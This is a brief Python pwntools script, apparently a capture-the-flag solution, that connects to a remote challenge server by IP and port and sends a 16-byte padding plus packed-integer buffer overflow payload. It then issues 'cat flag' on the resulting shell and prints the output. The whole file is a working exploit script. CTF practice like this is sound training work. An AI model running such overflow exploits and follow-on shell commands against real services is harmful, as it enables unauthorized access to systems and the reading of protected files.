from pwn import *

context.log_level = 'debug'

# io = process('./pwn')
io = remote('43.156.14.141', 1142)

payload = flat(['A' * 16, p64(114514)])

io.sendlineafter('Over flow me pls:\n', payload)

io.sendline(b'cat flag')
print(io.recvline().decode().strip())
io.close()
